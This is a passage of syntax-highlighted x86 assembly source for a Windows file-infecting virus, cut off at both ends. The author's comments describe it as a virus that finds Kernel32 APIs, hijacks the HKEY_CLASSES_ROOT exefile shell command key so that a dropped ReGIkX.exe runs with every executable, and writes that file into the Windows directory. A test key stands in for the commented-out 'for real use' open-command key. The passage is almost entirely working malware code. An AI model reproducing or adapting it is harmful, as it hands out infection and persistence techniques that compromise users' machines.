        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@EndExE</span><span class="sc0">
</span><span class="sc5">@@Cn1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">255D</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">@@NextNameByte</span><span class="sc0">
</span><span class="sc5">@@EndExE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">Edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc1">;finish the EXEcName</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">255D</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">@@Cn3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@NameDone</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@Cn3</span><span class="sc0">
</span><span class="sc5">@@NameDone</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@NoCommandLine</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@@NoFileToExec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">
        </span><span class="sc9">EndP</span><span class="sc0"> 

</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">RegHook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc6">pushA</span><span class="sc0">

</span><span class="sc1">;I like my GetMZ routine but, I found a major bug</span><span class="sc0">
</span><span class="sc1">;while the odds are small that it will find a MZ and then a PE that</span><span class="sc0">
</span><span class="sc1">;is the wrong one it can happen and this virus is an examaple of that</span><span class="sc0">
</span><span class="sc1">;when it infects a file which has an (PE) file offset of 1000h when you</span><span class="sc0">
</span><span class="sc1">;round the offset given in the eax to the last offset of 1000h you are</span><span class="sc0">
</span><span class="sc1">;now pointing at the first byte of this virus in that file then you check</span><span class="sc0">
</span><span class="sc1">;for MZ, PE you find it ... Not the host start, but the virus start. Oh well</span><span class="sc0">
</span><span class="sc1">;cant be sure on everything so I "fix" it by ensureing that the</span><span class="sc0">
</span><span class="sc1">;the value in Eax is one less then the start of the virus</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">H1</span><span class="sc0">
</span><span class="sc5">H1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">H1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMZ</span><span class="sc0">                   </span><span class="sc1">;Find where this file is loaded then</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;fix the return adress</span><span class="sc0">
        
        </span><span class="sc1">;virus is set to return to the host when done</span><span class="sc0">
        </span><span class="sc1">;now get the pntr off the stack that pnts to a K32 address</span><span class="sc0">
        </span><span class="sc1">;use that to find the address to getprocaddress</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;value inside Kernel32</span><span class="sc0">
                                        </span><span class="sc1">;usauly...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMZ</span><span class="sc0">                   </span><span class="sc1">;Get the start of the k32</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">                 </span><span class="sc1">;problem bail..</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">UhOh</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPI</span><span class="sc0">                  </span><span class="sc1">;get the Get Process Address</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">UhOh</span><span class="sc0">                    </span><span class="sc1">;problem bail</span><span class="sc0">

         
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SizeAPIAdd</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">API_LOC2b</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">     </span><span class="sc1">;push a location</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">API_LOC2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">      </span><span class="sc1">;push a location</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">Movsb</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">EAx</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">T1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">      </span><span class="sc1">;push a location</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc0">
        </span><span class="sc6">Stosd</span><span class="sc0">
        </span><span class="sc6">Stosd</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">T2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">      </span><span class="sc1">;push a location</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc0">
        </span><span class="sc6">Stosd</span><span class="sc0">
        </span><span class="sc6">Stosd</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">


        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">Eax</span><span class="sc0">             </span><span class="sc1">;Push the Eax</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">SetReg</span><span class="sc0">          </span><span class="sc1">;Acual work is done here</span><span class="sc0">


</span><span class="sc5">UhOh</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popA</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;Make Section R\W and Exec</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;CheckReg</span><span class="sc0">
        </span><span class="sc1">;  CreateFile</span><span class="sc0">
        </span><span class="sc1">;  SetReg</span><span class="sc0">
        </span><span class="sc1">;CloseReg</span><span class="sc0">
        </span><span class="sc1">;Host</span><span class="sc0">

</span><span class="sc1">;=====================================</span><span class="sc0">
</span><span class="sc1">;Passed to it</span><span class="sc0">
</span><span class="sc1">;On stack K32 = Kernel32 API</span><span class="sc0">
</span><span class="sc1">;and that fs:[14] = GetProcessAddress</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SetReg</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">  </span><span class="sc5">WINDOWS</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0">
</span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">@@K32</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">           </span><span class="sc1">;args passed to us</span><span class="sc0">
</span><span class="sc1">;local variable space</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@hAdv</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">          </span><span class="sc1">;advapi32 handle</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@LoadLib</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">       </span><span class="sc1">;Address if LoadLib</span><span class="sc0">

</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@RegOpen</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@RegSet</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@RegQuery</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@RegEnum</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@RegClose</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@Write</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@CreateF</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@CloseH</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@Read</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@hKey</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@mBox</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@Buff</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@Fhandle</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">          
</span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@Temp</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@GetLib</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@GetLib</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@@K32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@LoadLib</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@GetAdv</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Advapi32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@GetAdv</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@LoadLib</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@hAdv</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;check to see if all is ok</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@uups</span><span class="sc0">
</span><span class="sc1">;Now have all that is needed to read/write to a regisrty</span><span class="sc0">
</span><span class="sc1">;Try to open the Reg               </span><span class="sc0">

</span><span class="sc1">;Attempt to open the key or create a new one</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@GL1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RegCreateKeyExA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@GL1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@@hAdv</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">@@GetProcAdd</span><span class="sc0">

 
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">@@Disp</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@@Disp</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">;push    @@hKey</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">@@hKey</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">Large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;sec attr null</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0F003Fh</span><span class="sc0">                         </span><span class="sc1">;regsam</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">REG_OPTION_NON_VOLATILE</span><span class="sc0">   </span><span class="sc1">;Options</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@GetNullSt</span><span class="sc0">                     </span><span class="sc1">;null string</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@GetNullSt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;resv</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@Gs1</span><span class="sc0">
</span><span class="sc1">;StrLoc  db      "exefile\shell\open\command",0 ;for real use</span><span class="sc0">
</span><span class="sc5">StrLoc</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"exefile\shell\test\command"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@Gs1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">HKEY_CLASSES_ROOT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
 
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@uups</span><span class="sc0">          </span><span class="sc1">;couldn't open the key</span><span class="sc0">


</span><span class="sc1">;Ok have open the key now read and check if its ours</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Read the string</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@GL2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RegQueryValueExA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@GL2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc5">@@hAdv</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">@@GetProcAdd</span><span class="sc0">



        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">@@GetBufLen</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">255d</span><span class="sc0">
</span><span class="sc5">@@GetBufLen</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">EXEcName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">     </span><span class="sc1">;push a location</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@Buff</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">                  </span><span class="sc1">;of a buffer</span><span class="sc0">
                                                        </span><span class="sc1">;save it</span><span class="sc0">
</span><span class="sc1">;        Call    @@GetStr</span><span class="sc0">
</span><span class="sc1">;@@st    db      255d dup(0)</span><span class="sc0">
</span><span class="sc1">;@@GetStr:</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">@@GetDataType</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@@GetDataType</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">@@hKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">Ecx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">@@Buff</span><span class="sc4">]</span><span class="sc0">
 

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@New</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmpsd</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@CloseKey</span><span class="sc0">      </span><span class="sc1">;allready done</span><span class="sc0">
</span><span class="sc1">;Ok its there but not ours so just unhook whatever is there and replace it</span><span class="sc0">
</span><span class="sc1">;need to make our file in the Windows system directory if we cant do that</span><span class="sc0">
</span><span class="sc1">;bail out</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Createfile  </span><span class="sc0">
</span><span class="sc1">;1 Get windows directory</span><span class="sc0">
</span><span class="sc1">;2 Try to Create File</span><span class="sc0">
</span><span class="sc1">;       Bail if it exists ???              </span><span class="sc0">
</span><span class="sc1">;3 Write File from top 200 bytes</span><span class="sc0">
</span><span class="sc1">;  then Write again from top for rest of file</span><span class="sc0">
</span><span class="sc1">;4 close Handle</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@GetWinDir</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@GetWinDir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@@K32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">255D</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Edi</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@Prob</span><span class="sc0">

        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Edi</span><span class="sc0">

</span><span class="sc1">;This is the Key Entry we want to write</span><span class="sc0">
</span><span class="sc1">;"ReGIkX.exe" %1  %*</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">"GeR\"
</span><span class="sc0">        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc3">".XkI"</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc3">"ExE"</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc1">;Ok on Stack is the ptr to the string for our new file</span><span class="sc0">
</span><span class="sc1">;for the hell of it I'll us the the GetProcAdd and the</span><span class="sc0">
</span><span class="sc1">;string for CreateFileA in the other part of the Virus</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC6</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">      </span><span class="sc1">;Address of Str</span><span class="sc0">
                                                        </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc5">@@K32</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">@@GetProcAdd</span><span class="sc0">


        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc0">             </span><span class="sc1">;New File and Widows Directory</span><span class="sc0">


        </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">

        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc5">CREATE_NEW</span><span class="sc0">      </span><span class="sc1">;Create New File</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc1">;Only Write</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Edi</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc8">Ecx</span><span class="sc0">             </span><span class="sc1">;CreateFileA</span><span class="sc0">

